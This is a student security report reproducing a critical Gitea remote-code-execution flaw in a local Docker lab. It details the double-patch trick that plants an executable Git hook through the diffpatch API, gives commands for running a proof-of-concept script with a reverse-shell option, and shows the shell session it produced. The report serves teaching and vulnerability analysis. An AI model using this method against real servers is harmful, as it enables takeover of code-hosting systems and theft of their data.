# Network Security Term Project Report

**Name**: Student  
**Student ID**: [STUDENT_ID]

---

## I. CVE Vulnerability Information

### 1. CVE ID and Publication Date
- **CVE ID**: CVE-2026-60004 [1]
- **Publication Date**: 2026-08-26

### 2. CVSS Score and Vector
- **CVSS Version / Score**: CVSS v3.1 / 9.8 (Critical)
- **Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Scoring Source**: GitHub Security Advisory (GHSA-rcr6-4jqh-j84m) [2]

### 3. Affected Software or Components
- **Software Name**: Gitea
- **Vulnerable Versions**: `>= 1.17.0, < 1.27.1` [2]
- **Version Used in Experiment**: `1.27.0`

### 4. Vulnerable Environment
- **Operating System**: Linux / Unix-like systems
- **Dependencies**: Git `>= 2.32`
- **Deployment Conditions**:
  - Exposed `diffpatch` API endpoint (`/api/v1/repos/{owner}/{repo}/diffpatch`) [4].
  - Writable temporary repository directory mounted without `noexec`.
  - Public self-registration enabled (default setting, enabling unauthenticated access).

### 5. Vulnerability Type and Root Cause
- **Vulnerability Type**: CWE-94 (Improper Control of Generation of Code / Code Injection) [1, 2, 3]
- **Root Cause**: In `ApplyDiffPatch()` (`services/repository/files/patch.go`) [4], Gitea stages patches inside a temporary bare clone (`git clone --shared --bare`) using `git apply --cached --recount -3`. Submitting a new-file patch (`hooks/post-index-change`, mode `100755`) once commits the path into the target branch's Git tree in memory. Submitting the identical patch a second time against that branch triggers an add/add conflict where Git's `-3` (3-way merge) resolution writes the merged file directly to disk despite `--cached`. Because a bare clone's root directory is `$GIT_DIR`, writing to `hooks/post-index-change` installs a live Git hook that executes immediately when Git writes the updated index [2].

### 6. Trigger Conditions and Attack Prerequisites
- **Required Privileges**: Repository write access (effectively unauthenticated / `PR:N` when public self-registration is enabled).
- **Network / Input**: Two sequential HTTP `POST` requests to the `diffpatch` API [4] submitting the identical unified diff creating `hooks/post-index-change` with mode `100755`.
- **User Interaction**: None (`UI:N`).

### 7. Impact of Successful Exploitation
Remote Code Execution (RCE) with the privileges of the Gitea service user (`git`), permitting unauthorized access to repositories, server configuration, credentials, and full container compromise [2, 5].

---

## II. Experimental Setup

### 1. Operating System
- **Host OS**: Ubuntu 26.04.1 LTS (`x86_64`) on Linux Kernel `6.18.33.2-microsoft-standard-WSL2`
- **Container Base**: Alpine Linux v3.24 (`3.24.1`, `x86_64`) (Official Gitea Docker Image)

### 2. Software / Component Versions
- **Target Application**: Gitea `1.27.0`
- **Git Binary**: Git `2.54.0` (Vulnerable condition: Git `>= 2.32`)

### 3. Required Dependencies
- Docker Engine & Docker Compose plugin (for hosting the target container environment)
- Python 3 with `requests` (for executing the PoC verification script)

### 4. Network / Deployment Configuration
- **Container Network**: Docker Compose bridge (`172.20.0.0/16` in test environment)
- **Port Mapping**: `5000:3000` (Gitea HTTP Web UI and REST API; container port 3000 mapped to host port 5000)
- **Database**: Embedded SQLite3 at `/data/gitea/gitea.db`

### 5. Other Relevant Settings
- `GITEA__security__INSTALL_LOCK=true`: Bypasses initial setup wizard.
- `GITEA__database__DB_TYPE=sqlite3`: Configures standalone lightweight database.
- `GITEA__service__DISABLE_REGISTRATION=false`: Leaves public self-registration enabled. The verification scripts exploit this zero-credential vector to provision temporary accounts on demand, aligning with the `PR:N` CVSS metric without requiring hardcoded static credentials or external provisioning sidecars.

---

## III. Reproduction Evidence / Failure Analysis

### 1. Reproduction Steps
1. **Start Environment**:
   ```bash
   docker compose up -d
   ```
2. **Execute Automated Verification & Boundary Matrix**:
   ```bash
   # Automated PoC with container-side execution verification:
   python3 poc/exploit.py --url http://localhost:5000 --verify-container

   # Controlled variable architectural boundary matrix:
   python3 poc/matrix_test.py --url http://localhost:5000
   ```
3. *(Optional) Interactive Callback Verification*:
   ```bash
   GATEWAY_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' gitea-cve-2026-60004)"
   python3 poc/exploit.py --url http://localhost:5000 --lhost "${GATEWAY_IP}" --lport 4000
   ```

*Execution Flow*:
- Dynamically self-registers a disposable user account and creates a target repository over the REST API (zero prior credentials needed).
- Stashes or cleans any pre-existing `hooks/post-index-change` path on the target branch to ensure test idempotency.
- Dispatches Stage 1 patch adding `hooks/post-index-change` (`100755`) into the branch's Git index/tree.
- Dispatches Stage 2 identical patch, inducing the add/add 3-way merge conflict that forces Git to write `$GIT_DIR/hooks/post-index-change` to disk.
- Subsequent index write immediately triggers `post-index-change`, executing the payload under the `git` user.

### 2. Discussion

#### ➢ Success:
The reproduction succeeded deterministically. When duplicate patches targeting `hooks/post-index-change` were dispatched to the `diffpatch` API, Git's 3-way merge resolution dropped the executable hook into `/data/gitea/tmp/local-repo/upload.git<id>/hooks/post-index-change`. Immediately upon writing the updated index, Git executed the hook, yielding remote command execution as user `git` (`uid=1000, gid=1000`).

#### ➢ Controlled Variable & Architectural Boundary Analysis:
Rather than treating the vulnerability as an opaque black box, we empirically evaluated the system boundary conditions across 4 controlled test permutations (`poc/matrix_test.py`):

| Case | Test Condition | Target File Path | Repetitions | HTTP Statuses | Execution Result | Root Cause Analysis |
| :---: | :--- | :--- | :---: | :---: | :---: | :--- |
| **1** | **Single Patch Isolation** | `hooks/post-index-change` | 1x | `[201]` | ❌ FAILED | Git's `--cached` flag maintained in-memory isolation. No add/add conflict occurred; zero disk writes. |
| **2** | **Pre-existing File Vector** | `config` | 2x | `[201, 500]` | ❌ FAILED | 3-way merge aborted (`error: config: does not match index`). Pre-existing `$GIT_DIR` files on disk cannot be overwritten. |
| **3** | **Inapplicable Lifecycle Hook** | `hooks/pre-commit` | 2x | `[201, 201]` | ❌ FAILED | File dropped onto disk via conflict, but Gitea's plumbing-based index/tree commits do not invoke interactive `pre-commit` hooks. |
| **4** | **Target Exploit Condition** | `hooks/post-index-change` | 2x | `[201, 201]` | ✅ **SUCCESS** | Add/add conflict forced Git's `-3` merge output to disk. Writing the updated index immediately executed `post-index-change`. |

This confirms exploitation requires the exact convergence of:
1. An add/add collision with no common ancestor.
2. A target path initially absent from disk so Git's worktree-to-index verification succeeds.
3. An index-level client hook (`post-index-change`) that Git unconditionally invokes upon index writes.

#### ➢ Failure / Negative Findings:
Attempting to overwrite existing `$GIT_DIR` metadata files on disk such as `config` (Case 2) resulted in an internal server error (`HTTP 500`) on the second patch with Git error: `error: config: does not match index` / `error: cannot read the current contents of 'config'`. Because `$GIT_DIR/config` already exists on disk in the bare temporary clone and differs from the staged index blob committed in Stage 1, Git refuses to overwrite it. This eliminates arbitrary overwrite of pre-existing `$GIT_DIR` configuration files and explains why exploitation specifically targets `hooks/post-index-change` (where only `*.sample` hook files exist on disk by default).

### 3. Evidence

#### A. Automated PoC & Privilege Verification (`poc/exploit.py`):
```text
[*] Target URL: http://localhost:5000
[*] Self-registering fresh account: 'user_ecgc9f' (PR:N vector)
[+] Successfully authenticated as 'user_ecgc9f'
[*] Creating repository 'repo_0snyps'...
[+] Repository 'repo_0snyps' created (default branch: 'main')
[*] Stage 1: Sending initial patch to stage hook...
[*] Stage 2: Triggering add/add 3-way merge conflict to install hook...
[+] Exploit completed: 'hooks/post-index-change' installed and executed!
[+] Container verified execution output:
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
Linux 233fe2e85e2f 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64 Linux
```

#### B. Controlled Variable & Architectural Boundary Matrix (`matrix_test.py`):
```text
================================================================================
CVE-2026-60004 Architectural Matrix (http://localhost:5000)
User: user_ecgc9f | Repo: repo_0snyps
================================================================================

[*] [Test Case 1] Single Patch Isolation (hooks/post-index-change, 1x)
    HTTP: [201] | Execution: [-] FAILED | Boundary: [+] PASS

[*] [Test Case 2] Pre-existing File Vector (config, 2x)
    HTTP: [201, 500] | Execution: [-] FAILED | Boundary: [+] PASS

[*] [Test Case 3] Inapplicable Lifecycle Hook (hooks/pre-commit, 2x)
    HTTP: [201, 201] | Execution: [-] FAILED | Boundary: [+] PASS

[*] [Test Case 4] Target Exploit Condition (hooks/post-index-change, 2x)
    HTTP: [201, 201] | Execution: [+] SUCCESS | Boundary: [+] PASS

================================================================================
ARCHITECTURAL MATRIX SUMMARY
================================================================================
Case | Test Condition              | Target Path              | Repeat | HTTP         | Execution
--------------------------------------------------------------------------------
1    | Single Patch Isolation      | hooks/post-index-change  | 1x     | [201]        | FAILED   
2    | Pre-existing File Vector    | config                   | 2x     | [201, 500]   | FAILED   
3    | Inapplicable Lifecycle Hook | hooks/pre-commit         | 2x     | [201, 201]   | FAILED   
4    | Target Exploit Condition    | hooks/post-index-change  | 2x     | [201, 201]   | SUCCESS  
================================================================================
[+] All architectural boundary checks passed successfully.
```

#### C. Interactive Reverse Shell Session:
Host listener received an interactive callback from the Gitea service account inside the container:
```text
$ nc -lvnp 4000
Listening on 0.0.0.0 4000
Connection received on 172.20.0.2 41920
/bin/sh: can't access tty; job control turned off
/tmp $ id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
/tmp $ whoami
git
/tmp $ uname -a
Linux 233fe2e85e2f 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64 Linux
```

#### D. Server-Side Git 3-Way Merge & Collision Logs:
Server logs captured from `gitea-cve-2026-60004` verifying that Git enters 3-way merge on duplicate patches and aborts when attempting to overwrite pre-existing files on disk (`config`):
```text
2026/11/02 19:42:49 routers/api/v1/repo/file.go:596:handleChangeRepoFilesError() [E] InternalServerError: git apply error: exit status 1 - Performing three-way merge...
error: config: does not match index
error: cannot read the current contents of 'config'
error: config: patch does not apply
2026/11/02 19:42:49 HTTPRequest [I] router: completed POST /api/v1/repos/user_ecgc9f/repo_0snyps/diffpatch for 172.20.0.1:53922, 500 Internal Server Error in 26.3ms
```

---

## IV. References

### 1. Sources
- [1] CVE Record: https://www.cve.org/CVERecord?id=CVE-2026-60004
- [2] GitHub Advisory: https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m
- [3] NVD Record: https://nvd.nist.gov/vuln/detail/cve-2026-60004
- [4] Gitea diffpatch API Docs: https://docs.gitea.com/api/next/operations/repo-apply-diff-patch
- [5] RunZero Research: https://www.runzero.com/blog/gitea/

### 2. LLM Usage Statement
- **Tools and Models**: Gemini Web Chat (Gemini 3.8 Flash, Gemini 4 Argon), Antigravity Agent
- **Usage**:
  1. Refining report structure, academic technical depth, and English phrasing.
  2. Synthesizing reproduction steps and evidence formatting.
  3. Auditing configuration, removing dead legacy code, and establishing defensive checks.
- **Verification**: Verified code syntax, argument exclusivity, container status handling, and technical accuracy against official advisory GHSA-rcr6-4jqh-j84m.
